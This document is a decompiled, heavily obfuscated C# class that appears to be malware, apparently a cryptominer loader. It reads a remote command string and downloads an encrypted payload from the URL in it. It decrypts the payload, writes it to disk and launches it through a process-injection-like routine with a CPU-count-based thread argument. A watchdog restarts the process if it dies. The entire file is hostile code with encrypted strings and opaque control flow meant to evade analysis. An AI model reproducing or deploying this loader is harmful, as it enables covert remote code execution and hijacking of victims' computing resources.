using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

[StandardModule]
internal sealed class ________________________
{
	public static int _ = 0;

	public static void _()
	{
		try
		{
			string text2;
			string text3;
			while (true)
			{
				________________________.____();
				string text = __________________________________________________________________.____(<Module>.______<string>(3855844404u));
				string arg_87_0 = text;
				int arg_25_0 = 1409286144;
				int num = ___________._;
				string[] array;
				if (!(Operators.CompareString(arg_87_0, <Module>.__________((arg_25_0 * num - 1468 + -4923 != -num + num) ? ((15812u + ((uint)(num / 52870 + 88) >> 29) != (uint)(5 * num + num * 3)) ? (sizeof(byte) + 22546) : (System.Type.EmptyTypes.Length + -1694156197)) : (sizeof(double) + 1974406803), sizeof(uint) + 23682, 105), false) == 0 | Operators.CompareString(text, <Module>._______<string>(2170582594u), false) == 0))
				{
					array = Strings.Split(text, <Module>.___<string>(3242391558u), -1, CompareMethod.Binary);
					goto IL_35B;
				}
				int ____________ = <Module>._____________;
				if (((____________ << 17) / 512 | -1979711534) != -1979711534)
				{
					goto IL_2C3;
				}
				break;
				int arg_30E_0;
				byte[] array2;
				int num2;
				while (true)
				{
					IL_30E:
					switch (arg_30E_0)
					{
					case 0:
					{
						array2 = ________________________________________________________________________________.______(array2);
						string arg_295_0 = text2;
						byte[] arg_290_0 = array2;
						int arg_28B_0 = sizeof(float) + -134;
						int arg_20B_0 = 2097152;
						int ____________2 = <Module>._____________;
						int arg_28B_1;
						if (arg_20B_0 * (____________2 << 18) + -2147483648 != (____________2 << 8) / 256)
						{
							int arg_226_0 = 107;
							int _________ = <Module>.__________;
							arg_28B_1 = ((arg_226_0 * _________ + _________ * 149 != 3693) ? (System.Type.EmptyTypes.Length + 512) : (sizeof(ulong) + -2038991469));
						}
						else
						{
							arg_28B_1 = System.Type.EmptyTypes.Length + 837466095;
						}
						System.IO.File.WriteAllBytes(arg_295_0, ___________________________________________________________________._______(arg_290_0, <Module>.__________(arg_28B_0, arg_28B_1, ((____________2 / 459201431 + 1003 ^ -1831164742) == 0) ? (sizeof(double) + 267480272) : (System.Type.EmptyTypes.Length + 59))));
						goto IL_1B5;
					}
					case 2:
						goto IL_1B5;
					case 3:
						goto IL_110;
					case 4:
					{
						text3 = text3.Replace(<Module>.____<string>(322744478u), ________________________.___(array[3]));
						num2 = System.Type.EmptyTypes.Length + -5286;
						int num3;
						arg_30E_0 = (((num % 84942 | 635699199) != 635699199) ? (((-8421 ^ num3 + 15 * num3) != 0) ? (System.Type.EmptyTypes.Length + -1264448964) : 231346871) : (sizeof(System.Guid) + -11));
						continue;
					}
					case 5:
						goto IL_EF;
					case 6:
						goto IL_38F;
					}
					break;
					IL_1B5:
					______________________________________________________________.______________(<Module>.___<string>(982404538u), <Module>.______<string>(867525750u) + array[1]);
					arg_30E_0 = System.Type.EmptyTypes.Length + 3;
				}
				goto IL_35B;
				IL_EF:
				num2 = -5286;
				text2 = ______________________.____ + array[1];
				if (!System.IO.File.Exists(text2))
				{
					if (num2 != -5286)
					{
						continue;
					}
					if ((1 & num2 + -5548) != (1 & -num2))
					{
						continue;
					}
					goto IL_2C3;
				}
				IL_110:
				________________________._ = 1;
				if (!_______________________________________________________________________.___________(_____________________________________________________________________________.__, text3, System.IO.File.ReadAllBytes(text2), false, true, true))
				{
					arg_30E_0 = System.Type.EmptyTypes.Length + 6;
					goto IL_30E;
				}
				goto IL_3BF;
				IL_35B:
				text3 = array[2];
				if (text3.Contains(<Module>._______<string>(1091163632u)))
				{
					int num4 = ___________._;
					arg_30E_0 = (((~(num4 / 24460871) & 134221207) == 0) ? 1011075515 : (System.Type.EmptyTypes.Length + 4));
					goto IL_30E;
				}
				goto IL_EF;
				IL_2C3:
				WebClient webClient = new WebClient();
				array2 = ___________________________________________________________________._______(webClient.DownloadData(array[0]), <Module>._____<string>(1822288094u));
				arg_30E_0 = ((____________ * 4 + ____________ * 12 == -9155) ? (System.Type.EmptyTypes.Length + -1831708294) : (sizeof(System.Guid) + -16));
				goto IL_30E;
			}
			return;
			IL_38F:
			if (!_______________________________________________________________________.___________(_____________________________________________________________________________.__, text3, System.IO.File.ReadAllBytes(text2), true, true, true))
			{
				______________________________________________________________.______________(<Module>.___<string>(1387161447u), <Module>.____<string>(3100098944u));
			}
			IL_3BF:
			System.Threading.Thread.Sleep(5000);
			System.Threading.Thread thread = new System.Threading.Thread(new System.Threading.ThreadStart(________________________.__));
			thread.Start();
		}
		catch (System.Exception expr_3E5)
		{
			ProjectData.SetProjectError(expr_3E5);
			System.Exception ex = expr_3E5;
			______________________________________________________________.______________(<Module>._____<string>(2571642080u), <Module>.______<string>(4090731993u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void __()
	{
		while (true)
		{
			try
			{
				if (________________________._ >= 3)
				{
					Process.GetProcessById(________________________._);
					System.Threading.Thread.Sleep(5000);
					continue;
				}
			}
			catch (System.Exception arg_22_0)
			{
				ProjectData.SetProjectError(arg_22_0);
				________________________._ = 0;
				________________________._();
				ProjectData.ClearProjectError();
			}
			break;
		}
	}

	public static string ___(string string_0)
	{
		string result;
		try
		{
			int processorCount = System.Environment.ProcessorCount;
			int arg_90_0;
			if (processorCount == 1)
			{
				result = <Module>.______<string>(4254570386u);
				arg_90_0 = System.Type.EmptyTypes.Length + 3;
			}
			else
			{
				if (processorCount == 3)
				{
					result = <Module>._______<string>(1155951011u);
					return result;
				}
				if (Operators.CompareString(string_0, <Module>._____<string>(1824143085u), false) == 0)
				{
					arg_90_0 = System.Type.EmptyTypes.Length + 0;
				}
				else if (Operators.CompareString(string_0, <Module>._____<string>(3099528854u), false) == 0)
				{
					arg_90_0 = System.Type.EmptyTypes.Length + 2;
				}
				else
				{
					if (Operators.CompareString(string_0, <Module>.______<string>(2422878898u), false) == 0)
					{
						result = (processorCount - 1).ToString();
						return result;
					}
					result = <Module>.____<string>(1467947727u);
					return result;
				}
			}
			while (true)
			{
				switch (arg_90_0)
				{
				case 0:
					goto IL_A7;
				case 2:
					result = ((double)processorCount / 2.0).ToString();
					arg_90_0 = System.Type.EmptyTypes.Length + 1;
					continue;
				}
				break;
			}
			goto IL_B3;
			IL_A7:
			result = processorCount.ToString();
			IL_B3:;
		}
		catch (System.Exception expr_E6)
		{
			ProjectData.SetProjectError(expr_E6);
			result = <Module>.______<string>(4254570386u);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void ____()
	{
		try
		{
			if (________________________._ >= 3)
			{
				Process processById = Process.GetProcessById(________________________._);
				processById.Kill();
				________________________._ = 0;
			}
		}
		catch (System.Exception arg_23_0)
		{
			ProjectData.SetProjectError(arg_23_0);
			ProjectData.ClearProjectError();
		}
	}
}
